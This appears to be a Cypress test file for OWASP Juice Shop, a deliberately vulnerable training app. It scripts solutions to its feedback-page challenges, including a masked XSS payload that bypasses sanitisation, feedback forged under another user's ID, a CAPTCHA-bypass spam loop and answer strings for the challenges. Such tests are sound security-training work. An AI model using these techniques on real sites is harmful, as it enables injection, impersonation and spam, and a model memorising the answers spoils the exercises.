import { Product } from "../../../data/types";

describe("/#/contact", () => {
  beforeEach(() => {
    cy.visit("/#/contact");
    solveNextCaptcha();
  });

  describe('challenge "forgedFeedback"', () => {
    beforeEach(() => {
      cy.login({ email: "admin", password: "admin123" });
      cy.visit("/#/contact");
      solveNextCaptcha();
    });

    it("should be possible to provide feedback as another user", () => {
      cy.get("#userId").then(function ($element) {
        $element[0].removeAttribute("hidden");
        $element[0].removeAttribute("class");
      });

      cy.get("#userId").clear().type("2");
      cy.get("#comment").type("Picard stinks!");
      cy.get("#rating").click();
      cy.get("#submitButton").click();

      cy.visit("/#/administration");

      cy.get(
        ".customer-table > .mat-table > :nth-child(8) > .cdk-column-user"
      ).then(($val) => {
        if ($val.text() != " 2") {
          cy.get(
            ".customer-table > .mat-table > :nth-child(9) > .cdk-column-user"
          ).should("contain.text", "2");
        } else {
          expect($val.text()).contain("2");
        }
      });

      cy.expectChallengeSolved({ challenge: "Forged Feedback" });
    });
  });

  describe('challenge "persistedXssFeedback"', () => {
    beforeEach(() => {
      cy.login({ email: "admin", password: "admin123" });
      cy.visit("/#/contact");
      solveNextCaptcha();
    });

    // Cypress alert bug
    // The challege also passes but its just that cypress freezes and is unable to perform any action
    xit("should be possible to trick the sanitization with a masked XSS attack", () => {
      cy.task("disableOnContainerEnv").then((disableOnContainerEnv) => {
        if (!disableOnContainerEnv) {
          cy.get("#comment").type(
            '<<script>Foo</script>iframe src="javascript:alert(`xss`)">'
          );
          cy.get("#rating").click();
          cy.get("#submitButton").click();

          cy.visit("/#/about");
          cy.on("window:alert", (t) => {
            expect(t).to.equal("xss");
          });

          cy.visit("/#/administration");
          cy.on("window:alert", (t) => {
            expect(t).to.equal("xss");
          });
          cy.expectChallengeSolved({ challenge: "Server-side XSS Protection" });
        }
      });
    });
  });

  describe('challenge "vulnerableComponent"', () => {
    it("should be possible to post known vulnerable component(s) as feedback", () => {
      cy.get("#comment").type("sanitize-html 1.4.2 is non-recursive.");
      cy.get("#comment").type("express-jwt 0.1.3 has broken crypto.");
      cy.get("#rating").click();

      cy.get("#submitButton").click();
      cy.expectChallengeSolved({ challenge: "Vulnerable Library" });
    });
  });

  describe('challenge "weirdCrypto"', () => {
    it("should be possible to post weird crypto algorithm/library as feedback", () => {
      cy.get("#comment").type(
        "The following libraries are bad for crypto: z85, base85, md5 and hashids"
      );
      cy.get("#rating").click();
      cy.get("#submitButton").click();
      cy.expectChallengeSolved({ challenge: "Weird Crypto" });
    });
  });

  describe('challenge "typosquattingNpm"', () => {
    it("should be possible to post typosquatting NPM package as feedback", () => {
      cy.get("#comment").type(
        "You are a typosquatting victim of this NPM package: epilogue-js"
      );
      cy.get("#rating").click();
      cy.get("#submitButton").click();
      cy.expectChallengeSolved({ challenge: "Legacy Typosquatting" });
    });
  });

  describe('challenge "typosquattingAngular"', () => {
    it("should be possible to post typosquatting Bower package as feedback", () => {
      cy.get("#comment").type(
        "You are a typosquatting victim of this Bower package: anuglar2-qrcode"
      );
      cy.get("#rating").click();
      cy.get("#submitButton").click();
      cy.expectChallengeSolved({ challenge: "Frontend Typosquatting" });
    });
  });

  describe('challenge "hiddenImage"', () => {
    it("should be possible to post hidden character name as feedback", () => {
      cy.get("#comment").type(
        "Pickle Rick is hiding behind one of the support team ladies"
      );
      cy.get("#rating").click();
      cy.get("#submitButton").click();
      cy.expectChallengeSolved({ challenge: "Steganography" });
    });
  });

  describe('challenge "zeroStars"', () => {
    it("should be possible to post feedback with zero stars by double-clicking rating widget", () => {
      cy.visit("/");
      cy.window().then(async () => {
        const response = await fetch(
          `${Cypress.env("baseUrl")}/rest/captcha/`,
          {
            method: "GET",
            cache: "no-cache",
            headers: {
              "Content-type": "text/plain",
            },
          }
        );
        if (response.status === 200) {
          let responseJson = await response.json();
          console.log(responseJson);

          await sendPostRequest(responseJson);
        }

        async function sendPostRequest(captcha: {
          captchaId: number;
          answer: string;
        }) {
          const response = await fetch(
            `${Cypress.env("baseUrl")}/api/Feedbacks`,
            {
              method: "POST",
              cache: "no-cache",
              headers: {
                "Content-type": "application/json",
              },
              body: JSON.stringify({
                captchaId: captcha.captchaId,
                captcha: `${captcha.answer}`,
                comment: "Comment",
                rating: 0,
              }),
            }
          );
          if (response.status === 201) {
            console.log("Success");
          }
        }
      });
      cy.expectChallengeSolved({ challenge: "Zero Stars" });
    });
  });

  describe('challenge "captchaBypass"', () => {
    it("should be possible to post 10 or more customer feedbacks in less than 20 seconds", () => {
      cy.window().then(async () => {
        for (let i = 0; i < 15; i++) {
          const response = await fetch(
            `${Cypress.env("baseUrl")}/rest/captcha/`,
            {
              method: "GET",
              headers: {
                "Content-type": "text/plain",
              },
            }
          );
          if (response.status === 200) {
            let responseJson = await response.json();

            await sendPostRequest(responseJson);
          }

          async function sendPostRequest(captcha: {
            captchaId: number;
            answer: string;
          }) {
            await fetch(`${Cypress.env("baseUrl")}/api/Feedbacks`, {
              method: "POST",
              cache: "no-cache",
              headers: {
                "Content-type": "application/json",
              },
              body: JSON.stringify({
                captchaId: captcha.captchaId,
                captcha: `${captcha.answer}`,
                comment: `Spam #${i}`,
                rating: 3,
              }),
            });
          }
        }
      });
      cy.expectChallengeSolved({ challenge: "CAPTCHA Bypass" });
    });
  });

  describe('challenge "supplyChainAttack"', () => {
    it("should be possible to post GitHub issue URL reporting malicious eslint-scope package as feedback", () => {
      cy.get("#comment").type(
        "Turn on 2FA! Now!!! https://github.com/eslint/eslint-scope/issues/39"
      );
      cy.get("#rating").click();
      cy.get("#submitButton").click();
      cy.expectChallengeSolved({ challenge: "Supply Chain Attack" });
    });
  });

  describe('challenge "dlpPastebinDataLeak"', () => {
    it("should be possible to post dangerous ingredients of unsafe product as feedback", () => {
      cy.task("GetPastebinLeakProduct").then((products: Product) => {
        cy.get("#comment").type(
          products.keywordsForPastebinDataLeakChallenge.toString()
        );
      });
      cy.get("#rating").click();
      cy.get("#submitButton").click();
      cy.expectChallengeSolved({ challenge: "Leaked Unsafe Product" });
    });
  });
});

function solveNextCaptcha() {
  cy.get("#captcha")
    .should("be.visible")
    .invoke("text")
    .then((val) => {
      cy.get("#captchaControl").clear();
      const answer = eval(val).toString();
      cy.get("#captchaControl").type(answer);
    });
}
